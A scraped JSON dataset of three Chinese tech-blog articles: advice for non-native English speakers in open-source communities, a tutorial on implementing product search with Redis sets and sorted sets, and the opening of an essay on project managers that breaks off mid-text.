{"tags": "开源,英语,IT技术", "front_image_path": "full/dd36e1ac9db2af41888b4a17b76a865bb91d4510.jpg", "title": "给非英语母语的人从事开源项目的若干建议", "url_object_id": "a374e125ab3d41e57b4634a2be532439", "url": "http://blog.jobbole.com/111506/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/17/1/non-native-speakers-take-open-source-communities\">opensource.com</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8619-1.html\">Linux中国/zhousiyu325</a>   </div><p>大多数的开源项目的主要语言都是英语，但是开源项目的用户和贡献者却遍布全球。非英语母语的人在参与这个生态系统时会面临许多沟通和文化上的挑战。</p>\n<p>在这篇文章中，作为不以英语为母语的 OpenStack 的贡献者的我们将会分享一些所面临挑战——如何去克服它们，还有一些好的方案，它们能够减轻不以英语为母语且刚开始从事的人的焦虑。我们的总部在日本、巴西和中国，每天都会与世界各地的大型 OpenStack 社区合作。</p>\n<p>OpenStack 的官方语言是英语，这意味着我们是作为非英语为母语的人士来进行交流。</p>\n<h3 id=\"toc_1\">挑战</h3>\n<p>非英语为母语的人士在开源社区工作时会面临具体沟通挑战：它们与有限的语言技能和文化差异有关。</p>\n<h4 id=\"toc_2\">语言技能</h4>\n<p>让我们来关注在阅读、写作、听力和口语背后的具体语言技能。</p>\n<p><strong>阅读</strong>：这是最简单也是最重要的技能。最简单是因为：如果你不明白写了什么，你有机会再次阅读它，或者需要的话可以多次阅读。如果你遇到了一个不常见的短语、表达式或者缩写，你可以使用一个词典或者翻译器。在另一方面，它是最重要的技能是因为：对大多数开源项目而言，主要的交流方式都是邮件列表和 IRC。</p>\n<p><strong>写作</strong>：英语语法是一个问题，尤其是对句子结构不同的语言而言。这可能会在用电子邮件进行通信和通过 IRC 频道进行通信时产生问题。对一些人来说，写出又长又漂亮的句子比较困难，而普遍依赖于简单句子，这是因为这些易于书写和理解。</p>\n<p><strong>听力</strong>：这对非英语为母语的人来说比阅读和写作更加困难。通常，英语为母语的人之间的对话在非常快的，这就使得那些仍然处于刚从事阶段的人很难理解他们的讨论，同时也限制了他们参与到讨论当中。此外，试图理解一个遍布全球的社区的各种口音也增加了复杂性。有意思的是，美国人的发音往往比其他的容易理解。</p>\n<p><strong>口语</strong>：口语比听力更加的困难，因为参与者的词汇量可能会比较有限。而且，英语的音素和语法通常与那些母语不是英语的人的母语相差很大，这就使得互动更加的难以理解。</p>\n<h4 id=\"toc_3\">文化差异</h4>\n<p>在开源社区与其他人交流时，每种文化都有它自己不同的规范。例如，日本人通常不会明确的说好的或者不，他们认为这是尊重别人的一种方式，可以避免彼此间的争论。这通常与其他的文化大不一样，可能会对所表达的内容造成误解。</p>\n<p>在中国文化中，人们倾向于只是说好的，而不是说不，或者试图商讨。在一个像 OpenStack 这样的分布于全球的社区里，这通常会导致在表达意见时缺乏自信。另外，中国人喜欢首先列出事实，然后在后面给出结论，而这会对来自其他文化中的人造成困惑，因为这不是他们所期望的。</p>\n<p>例如，巴西人可能会认为讨论是以类似的方式进行的；然而，其他文化的反应会很直接和简短，这听起来可能会有点粗鲁。</p>\n<h3 id=\"toc_4\">克服障碍</h3>\n<p>语言技能方面的挑战要比文化差异方面的挑战容易克服。文化差异需要被受到尊重，然而英语技能却总是可以被改善的。</p>\n<p>为了刷新你的语言技能，你应该尽可能多地接触该语言。不要担心你的局限，只管尽自己所能，你终将会得到改善。</p>\n<p>尽可能多的阅读，因为这有助于你积累词汇。通过日常的聊天和邮件列表进行交流也很有帮助。一些工具，如实时字典和翻译器，对这些平台非常有用。</p>\n<p>与别人或者你自己交谈可以帮助你更自如地频繁地说话。进行一对一的对话来表达你的想法比在更大的群体中讨论更容易。</p>\n<h3 id=\"toc_5\">新手的融入</h3>\n<p>来自新手和母语者的一些举措可能会对学习过程产生积极的影响。</p>\n<h4 id=\"toc_6\">新手</h4>\n<p>说出和写下你的意见，并且提出你的问题；参与其中总是一个练习你的英语的很好的机会。不要害怕。</p>\n<p>对于会议，确保你提前准备过，这样你将会对会议主题比较熟悉，而且会对自己要表达的意见更加的自信。</p>\n<p>与英语为母语的人结交朋友，多和他们讨论来提高你的英语技能。</p>\n<p>用英语写博客和技术文章也是不错的主意。</p>\n<h4 id=\"toc_7\">给英语为母语的人士的建议</h4>\n<p>请说话慢一点儿，同时使用一些简单的单词和句子。如果你发现了非英语为母语的人使用英语中的一些错误请不要嘲笑他们，尝试鼓励新来的人表达自己的意见，让他们非常舒适地表达意见。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111506\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111506votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111506\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/b94146f42c8e0ca2b0f04ed89b59053c.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/06/19", "praise_nums": 1}
{"tags": " 1 评论 ,Redis,IT技术", "front_image_path": "full/0a03ec3e1ce1b668b8db0234731fac4915b1064d.jpg", "title": "一步步实现 Redis 搜索引擎", "url_object_id": "42369d324412b391499279a170e4ca36", "url": "http://blog.jobbole.com/111480/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md\">jasonGeng88</a>   </div><div>\n<h2>场景</h2>\n</div>\n<p>大家如果是做后端开发的，想必都实现过列表查询的接口，当然有的查询条件很简单，一条 SQL 就搞定了，但有的查询条件极其复杂，再加上库表中设计的各种不合理，导致查询接口特别难写，然后加班什么的就不用说了（<em>不知各位有没有这种感受呢~</em>）。</p>\n<p>下面以一个例子开始，这是某购物网站的搜索条件，如果让你实现这样的一个搜索接口，你会如何实现？（<em>当然你说借助搜索引擎，像 Elasticsearch 之类的，你完全可以实现。但我这里想说的是，如果要你自己实现呢？</em>）</p>\n<p><a href=\"https://github.com/jasonGeng88/blog/blob/master/201706/assets/redis_search_01.png\" target=\"_blank\"><img src=\"https://github.com/jasonGeng88/blog/raw/master/201706/assets/redis_search_01.png\" alt=\"\"></a></p>\n<p>从上图中可以看出，搜索总共分为6大类，每大类中又分了各个子类。这中间，各大类条件之间是取的交集，各子类中有单选、多选、以及自定义的情况，最终输出符合条件的结果集。</p>\n<p>好了，既然需求很明确了，我们就开始来实现。</p>\n<h2><a id=\"user-content-实现1\" class=\"anchor\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io#%E5%AE%9E%E7%8E%B01\"></a>实现1</h2>\n<p>率先登场是小A同学，他是写 SQL 方面的“专家”。小A信心满满的说：“不就是一个查询接口吗？看着条件很多，但凭着我丰富的 SQL 经验，这点还是难不倒我的。”</p>\n<p>于是乎就写出了下面这段代码（这里以 MYSQL 为例）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bce6b17dde237457310\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect ... from table_1\r\nleft join table_2\r\nleft join table_3\r\nleft join (select ... from table_x where ...) tmp_1\r\n...\r\nwhere ...\r\norder by ...\r\nlimit m,n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bce6b17dde237457310-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6b17dde237457310-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bce6b17dde237457310-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6b17dde237457310-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bce6b17dde237457310-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6b17dde237457310-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bce6b17dde237457310-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6b17dde237457310-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bce6b17dde237457310-1\"><span class=\"crayon-i\">select</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">table_1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6b17dde237457310-2\"><span class=\"crayon-e\">left </span><span class=\"crayon-e\">join </span><span class=\"crayon-e\">table_2</span></div><div class=\"crayon-line\" id=\"crayon-594bce6b17dde237457310-3\"><span class=\"crayon-e\">left </span><span class=\"crayon-e\">join </span><span class=\"crayon-e\">table_3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6b17dde237457310-4\"><span class=\"crayon-e\">left </span><span class=\"crayon-e\">join</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">select</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">table_x </span><span class=\"crayon-i\">where</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-sy\">_</span>1</div><div class=\"crayon-line\" id=\"crayon-594bce6b17dde237457310-5\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6b17dde237457310-6\"><span class=\"crayon-i\">where</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594bce6b17dde237457310-7\"><span class=\"crayon-e\">order </span><span class=\"crayon-i\">by</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6b17dde237457310-8\"><span class=\"crayon-i\">limit</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">n</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>代码在测试环境跑了一把，结果好像都匹配上了，于是准备上预发。这一上预发，问题就开始暴露出来。预发为了尽可能的逼真线上环境，所以数据量自然而然要比测试大的多。所以这么一个复杂的 SQL，它的执行效率可想而知。测试同学果断把小A的代码给打了回来。</p>\n<h2><a id=\"user-content-实现2\" class=\"anchor\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io#%E5%AE%9E%E7%8E%B02\"></a>实现2</h2>\n<p>总结了小A失败的教训，小B开始对SQL进行了优化，先是通过了<code>explain</code>关键字进行SQL性能分析，对该加索引的地方都加上了索引。同时将一条复杂SQL拆分成了多条SQL，计算结果在程序内存中进行计算。</p>\n<p>伪代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bce6b17de8980863330\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$result_1 = query('select ... from table_1 where ...');\r\n$result_2 = query('select ... from table_2 where ...');\r\n$result_3 = query('select ... from table_3 where ...');\r\n...\r\n\r\n$result = array_intersect($result_1, $result_2, $result_3, ...);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bce6b17de8980863330-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6b17de8980863330-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bce6b17de8980863330-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6b17de8980863330-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bce6b17de8980863330-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6b17de8980863330-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bce6b17de8980863330-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">result_1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">query</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'select ... from table_1 where ...'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6b17de8980863330-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">result_2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">query</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'select ... from table_2 where ...'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bce6b17de8980863330-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">result_3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">query</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'select ... from table_3 where ...'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6b17de8980863330-4\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594bce6b17de8980863330-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6b17de8980863330-6\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">array_intersect</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">result_1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">result_2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">result_3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>这种方案从性能上明显比第一种要好很多，可是在功能验收的时候，产品经理还是觉得查询速度不够快。小B自己也知道，每次查询都会向数据库查询多次，而且有些历史原因，部分条件是做不到单表查询的，所以查询等待的时间是避免不了的。</p>\n<h2><a id=\"user-content-实现3\" class=\"anchor\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io#%E5%AE%9E%E7%8E%B03\"></a>实现3</h2>\n<p>小C从上面的方案中看到了优化的空间。他发现小B在思路上是没问题的，将复杂条件拆分，计算各个子维度的结果集，最后将所有的子结果集进行一个汇总合并，得到最终想要的结果。</p>\n<p>于是他突发奇想，能否事先将各个子维度的结果集给缓存起来，这要查询的时候直接去取想要的子集，而不用每次去查库计算。</p>\n<p>这里小C采用 <a href=\"https://redis.io/\">Redis</a> 来存储缓存数据，用它的主要原因是，它提供了多种数据结构，并且在 Redis 中进行集合的交并集操作是一件很容易的事情。</p>\n<p>具体方案，如图所示：</p>\n<p><a href=\"https://github.com/jasonGeng88/blog/blob/master/201706/assets/redis_search_02.png\" target=\"_blank\"><img src=\"https://github.com/jasonGeng88/blog/raw/master/201706/assets/redis_search_02.png\" alt=\"\"></a></p>\n<p>这里每个条件都事先将计算好的结果集ID存入对应的key中，选用的数据结构是集合（Set）。查询操作包括：</p>\n<ul>\n<li>子类单选：直接根据条件 key，获取对应结果集；</li>\n<li>子类多选：根据多个条件 Key，进行并集操作，获取对应结果集；</li>\n<li>最终结果：将获取的所有子类结果集进行交集操作，得到最终结果；</li>\n</ul>\n<p><em><strong>这其实就是所谓的<a href=\"https://zh.wikipedia.org/wiki/%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95\">反向索引</a>。</strong></em></p>\n<p>这里会发现，漏了一个价格的条件。从需求中可知，价格条件是个区间，并且是无穷举的。所以上述的这种穷举条件的 Key-Value 方式是做不到的。这里我们采用 Redis 的另一种数据结构进行实现，有序集合（Sorted Set）：</p>\n<p><a href=\"https://github.com/jasonGeng88/blog/blob/master/201706/assets/redis_search_03.png\" target=\"_blank\"><img src=\"https://github.com/jasonGeng88/blog/raw/master/201706/assets/redis_search_03.png\" alt=\"\"></a></p>\n<p>将所有商品加入 Key 为价格的有序集合中，值为商品ID，每个值对应的分数为商品价格的数值。这样在 Redis 的有序集合中就可以通过<code>ZRANGEBYSCORE</code>命令，根据分数（价格）区间，获取相应结果集。</p>\n<p>至此，方案三的优化已全部结束，将数据的查询与计算通过缓存的手段，进行了分离。在每次查找时，只需要简单的查找 Redis 几次就能得出结果。查询速度上符合了验收的要求。</p>\n<h2><a id=\"user-content-扩展\" class=\"anchor\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io#%E6%89%A9%E5%B1%95\"></a>扩展</h2>\n<h3><a id=\"user-content-分页\" class=\"anchor\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io#%E5%88%86%E9%A1%B5\"></a>分页</h3>\n<p>这里你或许发现了一个严重的功能缺陷，列表查询怎么能没有分页。是的，我们马上来看 Redis 是如何实现分页的。</p>\n<p>分页主要涉及排序，这里简单起见，就以创建时间为例。</p>\n<p>如图所示：</p>\n<p><a href=\"https://github.com/jasonGeng88/blog/blob/master/201706/assets/redis_search_04.png\" target=\"_blank\"><img src=\"https://github.com/jasonGeng88/blog/raw/master/201706/assets/redis_search_04.png\" alt=\"\"></a></p>\n<p>图中蓝色部分是以创建时间为分值的商品有序集合，蓝色下方的结果集即为条件计算而得的结果，通过<code>ZINTERSTORE</code>命令，赋结果集权重为0，商品时间结果为1，取交集而得的结果集赋予创建时间分值的新有序集合。对新结果集的操作即能得到分页所需的各个数据：</p>\n<ul>\n<li>页面总数为：<code>ZCOUNT</code>命令</li>\n<li>当前页内容：<code>ZRANGE</code>命令</li>\n<li>若以倒序排列：<code>ZREVRANGE</code>命令</li>\n</ul>\n<h3><a id=\"user-content-数据更新\" class=\"anchor\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io#%E6%95%B0%E6%8D%AE%E6%9B%B4%E6%96%B0\"></a>数据更新</h3>\n<p>关于索引数据更新的问题，有两种方式来进行。一种是通过商品数据的修改，来即时触发更新操作，一种是通过定时脚本来进行批量更新。这里要注意的是，关于索引内容的更新，如果暴力的删除 Key，再重新设置 Key。因为 Redis 中两个操作不会是原子性进行的，所以中间可能存在空白间隙，建议采用仅移除集合中失效元素，添加新元素的方式进行。</p>\n<h3><a id=\"user-content-性能优化\" class=\"anchor\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io#%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96\"></a>性能优化</h3>\n<p>Redis 是内存级操作，所以单次的查询会很快。但是如果我们的实现中会进行多次的 Redis 操作，Redis 的多次连接时间可能是不必要时间消耗。通过使用<code>MULTI</code>命令，开启一个事务，将 Redis 的多次操作放在一个事务中，最后通过<code>EXEC</code>来进行原子性执行（<em><strong>注意：这里所谓的事务，只是将多个操作在一次连接中执行，如果执行过程中遇到失败，是不会回滚的</strong></em>）。</p>\n<h2><a id=\"user-content-总结\" class=\"anchor\" href=\"https://github.com/jasonGeng88/blog/blob/master/201706/redis-search.md?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io#%E6%80%BB%E7%BB%93\"></a>总结</h2>\n<p>这里只是一个采用 Redis 优化查询搜索的一个简单 Demo，和现有的开源搜索引擎相比，它更轻量，学习成本也相应低些。其次，它的一些思想与开源搜索引擎是类似的，如果再加上词语解析，也可以实现类似全文检索的功能。</p>\n<p>最后，未完，待续。。。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111480\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111480votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111480\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/08/redis-logo.png"], "fav_nums": 4, "comment_nums": 1, "create_date": "2017/06/19", "praise_nums": 1}
{"tags": " 1 评论 ,职场,项目经理,程序员", "front_image_path": "full/1ded311d6e5e90e971d375817a4f5efb8e7096f1.jpg", "title": "我眼中的项目经理", "url_object_id": "2139dbe97ca8c52f95ad3657fd02203b", "url": "http://blog.jobbole.com/111535/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/ljhdo/p/5068072.html\">Vic Liu</a>   </div><div>\n<h3>把想法变成项目，服务于业务</h3>\n<p>在项目组待的时间久了，渐渐地跟微软的项目经理Michael熟悉起来了，跟他有过很多次深入的聊天，向他请教过很多关于人生，理想，技术上的问题，不得不说，项目经理是我神往的角色。虽然我没有亲身经历过，但是我认为做项目经理很有意思，把一个想法变成项目，服务于业务，这是我期望的工作。 佛者说：“一花一世界，一叶一菩提”，不得不说，修行是一个技术活，面对同一个世界，眼界的不同，能够看到的事物也是不同的；同样一句话，阅历不同，理解也会不同。那我就说说我眼中的项目经理，与常人不同的是，他们总是更进一步，想的更多，做的更多。</p>\n<p>在每天的Daily 